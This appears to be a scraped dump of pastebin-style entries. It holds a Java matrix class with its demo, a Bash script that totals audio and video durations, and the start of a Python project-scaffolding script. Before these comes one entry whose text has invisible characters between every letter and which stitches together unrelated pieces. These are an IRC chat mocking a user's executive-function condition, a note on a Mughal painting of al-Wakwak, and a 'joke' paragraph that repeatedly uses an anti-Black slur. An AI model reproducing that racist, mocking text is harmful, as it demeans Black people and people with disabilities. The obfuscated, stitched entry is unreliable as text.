+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎""‎T‎h‎i‎s‎ ‎s‎c‎r‎e‎e‎n‎e‎r‎ ‎i‎s‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎t‎o‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎ ‎w‎h‎e‎t‎h‎e‎r‎ ‎y‎o‎u‎ ‎d‎e‎m‎o‎n‎s‎t‎r‎a‎t‎e‎ ‎s‎y‎m‎p‎t‎o‎m‎s‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎t‎o‎ ‎t‎h‎o‎s‎e‎ ‎o‎f‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎.‎ ‎A‎ ‎h‎i‎g‎h‎ ‎s‎c‎o‎r‎e‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎n‎e‎c‎e‎s‎s‎a‎r‎i‎l‎y‎ ‎m‎e‎a‎n‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎ ‎o‎r‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎.‎ ‎T‎h‎a‎t‎ ‎b‎e‎i‎n‎g‎ ‎s‎a‎i‎d‎,‎ ‎i‎f‎ ‎y‎o‎u‎r‎ ‎s‎c‎o‎r‎e‎ ‎i‎s‎ ‎4‎8‎-‎6‎4‎,‎ ‎t‎h‎a‎t‎ ‎m‎e‎a‎n‎s‎ ‎y‎o‎u‎ ‎a‎n‎s‎w‎e‎r‎e‎d‎ ‎""‎O‎f‎t‎e‎n‎""‎ ‎o‎r‎ ‎""‎V‎e‎r‎y‎ ‎O‎f‎t‎e‎n‎""‎ ‎t‎o‎ ‎m‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎s‎ ‎a‎n‎d‎ ‎s‎h‎o‎u‎l‎d‎ ‎s‎e‎e‎ ‎a‎ ‎t‎r‎a‎i‎n‎e‎d‎ ‎h‎e‎a‎l‎t‎h‎ ‎c‎a‎r‎e‎ ‎p‎r‎o‎f‎e‎s‎s‎i‎o‎n‎a‎l‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎
+[‎0‎8‎:‎2‎0‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎p‎o‎s‎s‎i‎b‎i‎l‎i‎t‎y‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎m‎a‎y‎ ‎b‎e‎ ‎e‎x‎p‎e‎r‎i‎e‎n‎c‎i‎n‎g‎ ‎s‎y‎m‎p‎t‎o‎m‎s‎ ‎o‎f‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎.‎ ‎A‎n‎ ‎a‎c‎c‎u‎r‎a‎t‎e‎ ‎d‎i‎a‎g‎n‎o‎s‎i‎s‎ ‎c‎a‎n‎ ‎o‎n‎l‎y‎ ‎b‎e‎ ‎m‎a‎d‎e‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎c‎l‎i‎n‎i‎c‎a‎l‎ ‎e‎v‎a‎l‎u‎a‎t‎i‎o‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎ ‎f‎o‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎a‎g‎e‎s‎ ‎1‎8‎ ‎a‎n‎d‎ ‎o‎l‎d‎e‎r‎.‎ ‎""‎
+[‎0‎8‎:‎2‎4‎]‎ ‎<‎+‎a‎b‎u‎m‎>‎ ‎I‎f‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎f‎i‎n‎i‎s‎h‎ ‎a‎n‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎d‎y‎s‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎t‎e‎s‎t‎,‎ ‎d‎o‎e‎s‎ ‎t‎h‎a‎t‎ ‎s‎e‎c‎r‎e‎t‎l‎y‎ ‎i‎m‎p‎l‎y‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎d‎o‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎d‎y‎s‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎
+[‎0‎8‎:‎2‎4‎]‎ ‎<‎+‎a‎b‎u‎m‎>‎ ‎?‎?‎?‎?‎
+[‎0‎8‎:‎2‎5‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎e‎x‎c‎u‎s‎e‎ ‎m‎e‎,‎
+[‎0‎8‎:‎2‎5‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎i‎s‎ ‎m‎y‎ ‎c‎o‎n‎d‎i‎t‎i‎o‎n‎ ‎a‎ ‎j‎o‎k‎e‎ ‎t‎o‎ ‎y‎o‎u‎ ‎?‎
+[‎0‎8‎:‎2‎5‎]‎ ‎<‎+‎a‎b‎u‎m‎>‎ ‎Y‎e‎s‎
+[‎0‎8‎:‎2‎5‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎a‎b‎l‎e‎>‎ ‎w‎h‎y‎
+[‎0‎8‎:‎2‎5‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎i‎t‎h‎ ‎a‎d‎h‎d‎ ‎a‎n‎d‎ ‎e‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎i‎s‎s‎u‎e‎s‎ ‎a‎l‎s‎o‎ ‎e‎x‎h‎i‎b‎i‎t‎ ‎h‎y‎p‎e‎r‎f‎o‎c‎u‎s‎
+[‎0‎8‎:‎2‎6‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎W‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎w‎i‎l‎l‎ ‎g‎e‎t‎ ‎l‎o‎c‎k‎e‎d‎ ‎i‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎w‎r‎o‎n‎g‎ ‎t‎h‎i‎n‎g‎ ‎a‎n‎d‎ ‎n‎e‎g‎l‎e‎c‎t‎ ‎o‎t‎h‎e‎r‎ ‎t‎a‎s‎k‎s‎.‎ ‎I‎t‎’‎s‎ ‎n‎o‎t‎ ‎j‎u‎s‎t‎ ‎o‎h‎ ‎I‎ ‎g‎o‎t‎ ‎d‎i‎s‎t‎r‎a‎c‎t‎e‎d‎ ‎b‎y‎ ‎a‎ ‎s‎q‎u‎i‎r‎r‎e‎l‎.‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+
+A‎l‎-‎W‎a‎k‎w‎a‎k‎ ‎i‎s‎ ‎a‎n‎ ‎i‎s‎l‎a‎n‎d‎,‎ ‎o‎r‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎o‎n‎e‎ ‎i‎s‎l‎a‎n‎d‎,‎ ‎i‎n‎ ‎m‎e‎d‎i‎e‎v‎a‎l‎ ‎A‎r‎a‎b‎i‎c‎ ‎g‎e‎o‎g‎r‎a‎p‎h‎i‎c‎a‎l‎ ‎a‎n‎d‎ ‎i‎m‎a‎g‎i‎n‎a‎t‎i‎v‎e‎ ‎l‎i‎t‎e‎r‎a‎t‎u‎r‎e‎.‎ ‎S‎o‎u‎r‎c‎e‎s‎ ‎v‎a‎r‎i‎o‎u‎s‎l‎y‎ ‎i‎d‎e‎n‎t‎i‎f‎y‎ ‎a‎l‎-‎W‎a‎k‎w‎a‎k‎ ‎a‎s‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎i‎n‎g‎ ‎J‎a‎p‎a‎n‎,‎ ‎M‎a‎d‎a‎g‎a‎s‎c‎a‎r‎,‎ ‎S‎u‎m‎a‎t‎r‎a‎ ‎o‎r‎ ‎J‎a‎v‎a‎,‎ ‎w‎i‎t‎h‎ ‎o‎t‎h‎e‎r‎s‎ ‎d‎e‎s‎c‎r‎i‎b‎i‎n‎g‎ ‎i‎t‎ ‎a‎s‎ ‎a‎n‎ ‎i‎s‎l‎a‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎C‎h‎i‎n‎a‎ ‎S‎e‎a‎ ‎r‎u‎l‎e‎d‎ ‎b‎y‎ ‎a‎ ‎q‎u‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎a‎n‎ ‎e‎n‎t‎i‎r‎e‎l‎y‎ ‎f‎e‎m‎a‎l‎e‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎i‎s‎ ‎p‎a‎i‎n‎t‎i‎n‎g‎ ‎i‎n‎ ‎w‎a‎t‎e‎r‎c‎o‎l‎o‎r‎ ‎a‎n‎d‎ ‎g‎o‎l‎d‎ ‎o‎n‎ ‎p‎a‎p‎e‎r‎ ‎w‎a‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎i‎n‎ ‎M‎u‎g‎h‎a‎l‎ ‎I‎n‎d‎i‎a‎ ‎i‎n‎ ‎t‎h‎e‎ ‎e‎a‎r‎l‎y‎ ‎1‎6‎0‎0‎s‎,‎ ‎a‎n‎d‎ ‎d‎e‎p‎i‎c‎t‎s‎ ‎a‎ ‎p‎l‎a‎n‎t‎ ‎t‎h‎a‎t‎ ‎b‎r‎i‎n‎g‎s‎ ‎f‎o‎r‎t‎h‎ ‎a‎n‎i‎m‎a‎l‎ ‎l‎i‎f‎e‎ ‎i‎n‎ ‎m‎u‎l‎t‎i‎p‎l‎e‎ ‎f‎o‎r‎m‎s‎,‎ ‎d‎e‎r‎i‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎a‎ ‎c‎o‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎m‎e‎d‎i‎e‎v‎a‎l‎ ‎P‎e‎r‎s‎i‎a‎n‎ ‎a‎n‎d‎ ‎Q‎u‎r‎a‎n‎i‎c‎ ‎s‎o‎u‎r‎c‎e‎s‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎d‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎a‎l‎-‎W‎a‎k‎w‎a‎k‎ ‎a‎s‎ ‎i‎n‎h‎a‎b‎i‎t‎e‎d‎ ‎b‎y‎ ‎h‎a‎l‎f‎-‎p‎l‎a‎n‎t‎ ‎a‎n‎d‎ ‎h‎a‎l‎f‎-‎a‎n‎i‎m‎a‎l‎ ‎c‎r‎e‎a‎t‎u‎r‎e‎s‎.‎ ‎T‎h‎e‎ ‎w‎o‎r‎k‎ ‎i‎s‎ ‎n‎o‎w‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎o‎l‎l‎e‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎l‎e‎v‎e‎l‎a‎n‎d‎ ‎M‎u‎s‎e‎u‎m‎ ‎o‎f‎ ‎A‎r‎t‎ ‎i‎n‎ ‎O‎h‎i‎o‎.‎
+
+P‎a‎i‎n‎t‎i‎n‎g‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎u‎n‎k‎n‎o‎w‎n‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎
+
+Y‎o‎u‎ ‎g‎u‎y‎s‎ ‎m‎a‎y‎ ‎b‎e‎ ‎w‎o‎n‎d‎e‎r‎i‎n‎g‎ ‎w‎h‎y‎ ‎I‎'‎m‎ ‎a‎ ‎n‎i‎g‎g‎e‎r‎ ‎n‎o‎w‎.‎ ‎W‎e‎l‎l‎,‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎k‎n‎o‎w‎ ‎i‎f‎ ‎y‎o‎u‎ ‎k‎n‎e‎w‎ ‎t‎h‎i‎s‎ ‎a‎b‎o‎u‎t‎ ‎m‎e‎,‎ ‎b‎u‎t‎ ‎I‎ ‎c‎a‎n‎ ‎s‎h‎a‎p‎e‎s‎h‎i‎f‎t‎.‎.‎.‎ ‎T‎h‎a‎t‎'‎s‎ ‎r‎i‎g‎h‎t‎.‎ ‎I‎ ‎c‎a‎n‎ ‎t‎r‎a‎n‎s‎f‎o‎r‎m‎ ‎i‎n‎t‎o‎ ‎a‎n‎y‎ ‎a‎n‎i‎m‎a‎l‎ ‎I‎ ‎w‎a‎n‎t‎,‎ ‎n‎o‎t‎ ‎j‎u‎s‎t‎ ‎n‎i‎g‎g‎e‎r‎s‎.‎ ‎M‎a‎y‎b‎e‎ ‎t‎o‎m‎o‎r‎r‎o‎w‎ ‎I‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎a‎ ‎t‎o‎u‎c‎a‎n‎.‎.‎.‎ ‎O‎h‎ ‎f‎u‎c‎k‎ ‎n‎e‎v‎e‎r‎m‎i‎n‎d‎.‎"
+qhSfTCPa,Demo,AlexandrP,Java,Thursday 4th of April 2024 08:13:17 AM CDT,"package com.epam.rd.qa.basicio;
+
+import java.util.Random;
+
+public class Demo {
+    public static void main(String[] args) {
+        mulMain(args);
+    }
+
+    static void mulMain(String[] args) {
+        Random r = new Random(10);
+        Matrix m1 = randomInit(r, 5, 5);
+        Matrix m2 = randomInit(r, 5, 5);
+        r = new Random(15);
+        Matrix m3 = randomInit(r, 2, 3);
+        Matrix m4 = randomInit(r, 3, 2);
+        r = new Random(2);
+        Matrix m5 = randomInit(r, 3, 1);
+        Matrix m6 = randomInit(r, 1, 3);
+        System.out.printf(""Seed 10 - m1.multiply(m2) %s%n"", m1.multiply(m2));
+        System.out.printf(""Seed 10 - m2.multiply(m1) %s%n"", m2.multiply(m1));
+        System.out.printf(""Seed 15 - m3.multiply(m4) %s%n"", m3.multiply(m4));
+        System.out.printf(""Seed 15 - m4.multiply(m3) %s%n"", m4.multiply(m3));
+        System.out.printf(""Seed  2 - m5.multiply(m6) %s%n"", m5.multiply(m6));
+        System.out.printf(""Seed  2 - m6.multiply(m5) %s%n"", m6.multiply(m5));
+    }
+
+    static void subMain(String[] args) {
+        Random r = new Random(10);
+        Matrix m1 = randomInit(r, 5, 5);
+        Matrix m2 = randomInit(r, 5, 5);
+        r = new Random(15);
+        Matrix m3 = randomInit(r, 1, 3);
+        Matrix m4 = randomInit(r, 1, 3);
+        r = new Random(2);
+        Matrix m5 = randomInit(r, 3, 1);
+        Matrix m6 = randomInit(r, 3, 1);
+        System.out.printf(""Seed 10 - m1.subtract(m2) %s%n"", m1.subtract(m2));
+        System.out.printf(""Seed 10 - m2.subtract(m1) %s%n"", m2.subtract(m1));
+        System.out.printf(""Seed 10 - m1.subtract(m1) %s%n"", m1.subtract(m1));
+        System.out.printf(""Seed 15 - m3.subtract(m4) %s%n"", m3.subtract(m4));
+        System.out.printf(""Seed 15 - m4.subtract(m3) %s%n"", m4.subtract(m3));
+        System.out.printf(""Seed 15 - m4.subtract(m4) %s%n"", m3.subtract(m3));
+        System.out.printf(""Seed  2 - m5.subtract(m6) %s%n"", m5.subtract(m6));
+        System.out.printf(""Seed  2 - m6.subtract(m5) %s%n"", m6.subtract(m5));
+        System.out.printf(""Seed  2 - m6.subtract(m6) %s%n"", m6.subtract(m6));
+    }
+
+    static void addMain(String[] args) {
+        Random r = new Random(10);
+        Matrix m1 = randomInit(r, 5, 5);
+        Matrix m2 = randomInit(r, 5, 5);
+        r = new Random(15);
+        Matrix m3 = randomInit(r, 1, 3);
+        Matrix m4 = randomInit(r, 1, 3);
+        r = new Random(2);
+        Matrix m5 = randomInit(r, 3, 1);
+        Matrix m6 = randomInit(r, 3, 1);
+        System.out.printf(""Seed 10 - m1.add(m2) %s%n"", m1.add(m2));
+        System.out.printf(""Seed 10 - m1.add(m1) %s%n"", m1.add(m1));
+        System.out.printf(""Seed 10 - m2.add(m2) %s%n"", m2.add(m2));
+        System.out.printf(""Seed 15 - m3.add(m4) %s%n"", m3.add(m4));
+        System.out.printf(""Seed 15 - m3.add(m3) %s%n"", m3.add(m3));
+        System.out.printf(""Seed 15 - m4.add(m4) %s%n"", m4.add(m4));
+        System.out.printf(""Seed  2 - m5.add(m6) %s%n"", m5.add(m6));
+        System.out.printf(""Seed  2 - m5.add(m5) %s%n"", m5.add(m5));
+        System.out.printf(""Seed  2 - m6.add(m6) %s%n"", m6.add(m6));
+    }
+
+    static Matrix randomInit(Random r,  int rows, int cols) {
+        double[][] doubles = new double[rows][];
+        for (int i = 0; i < rows; i++) {
+            doubles[i] = r.doubles(cols, -25., 25.).toArray();
+        }
+        return new Matrix(doubles);
+    }
+
+}
+"
+VGw2iZEn,Matrix.java,AlexandrP,Java,Thursday 4th of April 2024 08:10:55 AM CDT,"package com.epam.rd.qa.basicio;
+
+/**
+ * Encapsulates two-dimensional array-matrix block of real ({@code double}) type.
+ * {@code Matrix} is the cover for two-dimensional array of real values, storing matrix
+ * values with operations of matrix addition, deduction, and multiplication.
+ */
+public class Matrix {
+
+    private final double[][] matrix;
+    private final int rows;
+    private final int columns;
+
+    /**
+     * Creates an empty matrix with predetermined number
+     * of rows and columns (all values in matrix equal to 0)
+     *
+     * @param rows number of rows
+     * @param cols number of columns
+     * @throws MatrixException if {@code rows} or {@code cols} less than 1
+     */
+    public Matrix(int rows, int cols) throws MatrixException {
+        if (rows < 1 || cols < 1) {
+            throw new MatrixException(""Rows and columns must be greater than 0"");
+        }
+        this.rows = rows;
+        this.columns = cols;
+        this.matrix = new double[rows][cols];
+    }
+
+    /**
+     * Creates a matrix based on existing two-dimensional array
+     *
+     * @param values two-dimensional array
+     * @throws MatrixException if {@code rows} or {@code cols} less than 1
+     */
+    public Matrix(double[][] values) throws MatrixException {
+        if (values.length < 1 || values[0].length < 1) {
+            throw new MatrixException(""Rows and columns must be greater than 0"");
+        }
+        this.rows = values.length;
+        this.columns = values[0].length;
+        this.matrix = new double[rows][columns];
+        for (int i = 0; i < rows; i++) {
+            if (values[i].length != columns) {
+                throw new MatrixException(""All rows must have the same number of columns"");
+            }
+            System.arraycopy(values[i], 0, this.matrix[i], 0, columns);
+        }
+    }
+
+    /**
+     * Returns count of matrix rows.
+     *
+     * @return count of rows in the matrix
+     */
+    public int getRows() {
+        return rows;
+    }
+
+    /**
+     * Returns count of matrix columns
+     *
+     * @return count of columns in the matrix
+     */
+    public int getColumns() {
+        return columns;
+    }
+
+    /**
+     * Returns an element via predetermined correct indexes.
+     *
+     * @param row row index
+     * @param col column index
+     * @return the element via indexes
+     * @throws MatrixException if index out of bounds
+     */
+    public double get(int row, int col) throws MatrixException {
+        if (row < 0 || row >= rows || col < 0 || col >= columns) {
+            throw new MatrixException(""Index out of bounds"");
+        }
+        return matrix[row][col];
+    }
+
+    /**
+     * Sets new value via predetermined correct indexes.
+     *
+     * @param row   row index
+     * @param col   column index
+     * @param value value to set
+     * @throws MatrixException if index out of bounds
+     */
+    public void set(int row, int col, double value) throws MatrixException {
+        if (row < 0 || row >= rows || col < 0 || col >= columns) {
+            throw new MatrixException(""Index out of bounds"");
+        }
+        matrix[row][col] = value;
+    }
+
+    /**
+     * Returns standard two-dimensional array out of matrix.
+     * Any changes in the returned array will be reflected to internal array.
+     *
+     * @return matrix values
+     */
+    public double[][] toArray() {
+        double[][] result = new double[rows][columns];
+        for (int i = 0; i < rows; i++) {
+            System.arraycopy(matrix[i], 0, result[i], 0, columns);
+        }
+        return result;
+    }
+
+    /**
+     * Adds all elements of {@code other} matrix to corresponding elements
+     * of this matrix and creates new {@code Matrix} with resulting two-dimensional array
+     *
+     * @param other another {@code Matrix} object
+     * @return new matrix
+     * @throws MatrixException if matrices have different size
+     */
+    public Matrix add(Matrix other) throws MatrixException {
+        if (this.rows != other.rows || this.columns != other.columns) {
+            throw new MatrixException(""Matrices must have the same dimensions"");
+        }
+        double[][] result = new double[rows][columns];
+        for (int i = 0; i < rows; i++) {
+            for (int j = 0; j < columns; j++) {
+                result[i][j] = this.matrix[i][j] + other.matrix[i][j];
+            }
+        }
+        return new Matrix(result);
+    }
+
+    /**
+     * Subtract all elements of {@code other} matrix from corresponding elements
+     * of this matrix and creates new {@code Matrix} with resulting two-dimensional array
+     *
+     * @param other another {@code Matrix} object
+     * @return new matrix
+     * @throws MatrixException if matrices have different size
+     */
+    public Matrix subtract(Matrix other) throws MatrixException {
+        if (this.rows != other.rows || this.columns != other.columns) {
+            throw new MatrixException(""Matrices must have the same dimensions"");
+        }
+        double[][] result = new double[rows][columns];
+        for (int i = 0; i < rows; i++) {
+            for (int j = 0; j < columns; j++) {
+                result[i][j] = this.matrix[i][j] - other.matrix[i][j];
+            }
+        }
+        return new Matrix(result);
+    }
+
+    /**
+     * Multiply this matrix to {@code other} matrix.<br/>
+     * See
+     * <a href=""https://en.wikipedia.org/wiki/Matrix_multiplication"">Matrix multiplication</a>
+     * <a href=""https://en.wikipedia.org/wiki/Matrix_multiplication#Definition"">Matrix multiplication (definition)</a>
+     *
+     * @param other another {@code Matrix} object
+     * @return new matrix
+     * @throws MatrixException if columns number of {@code this} matrix is not equal to rows num ber of {@code other} matrix
+     */
+    public Matrix multiply(Matrix other) throws MatrixException {
+        if (this.columns != other.rows) {
+            throw new MatrixException(""Number of columns in the first matrix must be equal to the number of rows in the second matrix"");
+        }
+        double[][] result = new double[this.rows][other.columns];
+        for (int i = 0; i < this.rows; i++) {
+            for (int j = 0; j < other.columns; j++) {
+                double sum = 0;
+                for (int k = 0; k < this.columns; k++) {
+                    sum += this.matrix[i][k] * other.matrix[k][j];
+                }
+                result[i][j] = sum;
+            }
+        }
+        return new Matrix(result);
+    }
+
+    /**
+     * Exception class for Matrix-related issues.
+     */
+    public static class MatrixException extends Exception {
+        public MatrixException(String message) {
+            super(message);
+        }
+    }
+}
+"
+ux3x6jhn,Untitled,iconoclasthero,Bash,Thursday 4th of April 2024 08:04:44 AM CDT,"$ cat ~/bin/mediaduration
+#!/bin/bash
+# nb: the swp file that editscript relies on is provided by nano
+
+editscript(){
+  local scriptname script path swp; scriptname=$(realpath ""$0"" 2>/dev/null); script=""${scriptname##*/}""; path=""${scriptname%/*}""; swp=""$path/.$script.swp""
+     [[ ! -e ""$swp"" ]] && printf ""\n\n%s\n\n"" ""$swp"" && (/usr/bin/nano ""$scriptname"") && exit
+     printf ""\n%s is already being edited.\n%s exists; try fg or look in another window.\n"" ""$scriptname"" ""$swp""; exit ;}
+
+pause(){ read -p ""$*"" ; }
+
+[[ ""$1"" == @(edit|e|nano|-e|-E) ]] && editscript
+
+readarray exts < <(find . -type f | sed -rn 's|.*/[^/]+\.([^/.]+)$|\1|p' | sort -u)
+
+if [ -n ""$1"" ];
+ then
+  find -type f -name ""*.$1"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+else
+#mp3
+ [[ ""${exts[@]}"" =~ mp3 ]] && printf ""Duration of .mp3 files: "" && find -type f -iname ""*.mp3"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' |tail -n 1
+#mp3 too
+ [[ ""${exts[@]}"" =~ mp3 ]] && printf ""Duration of .mp3 files: "" && find -type f -iname ""*.mp3"" -print0 | while IFS= read -r -d '' file; do ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 ""$file"" 2>/dev/null; done | awk '{s+=$1} END {printf ""%02d:%02d:%02d\n"",s/3600,s%3600/60,s%60}'
+#m4a
+ [[ ""${exts[@]}"" =~ m4a ]] && printf ""Duration of .m4a files: "" && find -type f -iname ""*.m4a"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+#m4b
+ [[ ""${exts[@]}"" =~ m4b ]] && printf ""Duration of .m4b files: "" && find -type f -iname ""*.m4b"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+#flac
+ [[ ""${exts[@]}"" =~ flac ]] && printf ""Duration of .flac files: "" && find -type f -iname ""*.flac"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+ [[ ""${exts[@]}"" =~ flac ]] && printf ""Duration of .flac (ffmpeg) files: "" && find -type f -iname ""*.flac"" -print0 | while IFS= read -r -d '' file; do ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 ""$file"" 2>/dev/null; done | awk '{s+=$1} END {printf ""%02d:%02d:%02d\n"",s/3600,s%3600/60,s%60}'
+#ogg
+ [[ ""${exts[@]}"" =~ ogg ]] && printf ""Duration of .ogg files: "" && find -type f -iname ""*.ogg"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+#mp4
+ [[ ""${exts[@]}"" =~ mp4 ]] && printf ""Duration of .mp4 files: "" && find -type f -iname ""*.mp4"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+#avi
+ [[ ""${exts[@]}"" =~ avi ]] && printf ""Duration of .avi files: "" && find -type f -iname ""*.avi"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+#shn -- ffmpeg doesn't seem to work with this...
+ [[ ""${exts[@]}"" =~ shn ]] && printf ""Duration of .shn files: "" && find -type f -iname ""*.shn"" -print0 | while IFS= read -r -d '' file; do ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 ""$file"" 2>/dev/null; done | awk '{s+=$1} END {printf ""%02d:%02d:%02d\n"",s/3600,s%3600/60,s%60}'
+#wav -- ffmpeg usually has trouble with this
+ [[ ""${exts[@]}"" =~ wav ]] && printf ""Duration of .wav files: "" && find -type f -iname ""*.wav"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+ [[ ""${exts[@]}"" =~ wav ]] && printf ""Duration of .wav files: "" && find -type f -iname ""*.wav"" -print0 | while IFS= read -r -d '' file; do ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 ""$file"" 2>/dev/null; done | awk '{s+=$1} END {printf ""%02d:%02d:%02d\n"",s/3600,s%3600/60,s%60}'
+
+#opus
+ [[ ""${exts[@]}"" =~ opus ]] && printf ""Duration of .opus files: "" && find -type f -iname ""*.opus"" -print0 | xargs -0 mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1
+ [[ ""${exts[@]}"" =~ opus ]] && printf ""Duration of .opus files: "" && find -type f -iname ""*.opus"" -print0 | while IFS= read -r -d '' file; do ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 ""$file"" 2>/dev/null; done | awk '{s+=$1} END {printf ""%02d:%02d:%02d\n"",s/3600,s%3600/60,s%60}'
+fi
+
+"
+xibG2mhB,Default Python Application Script,RapidMod,Python,Thursday 4th of April 2024 07:59:44 AM CDT,"""""""
+Project Structure Creation Script
+
+Description:
+This script is designed to automatically generate a default directory structure for Python projects,
+aimed at ensuring a clean and efficient organization for development. It creates a series of directories
+and files that form the foundation of a well-structured application, including places for libraries,
+utilities, services, and tests, along with the initial setup for gitignore, requirements, and README files.
+
+Getting Started:
+1. Ensure Python 3.x is installed on your system.
+2. Save this script to your desired project root directory.
+3. Run the script using the command `python <script_name>.py` in your terminal or command prompt.
+4. The script will create the basic project structure under your current directory, including:
+   - A source directory (`src`) with a subdirectory for the app, libraries (`libs`), utilities (`utils`),
+     and services (`services`).
+   - Placeholder files for the main application (`run.py`), project requirements (`requirements.txt`),
+     and documentation (`README.md`).
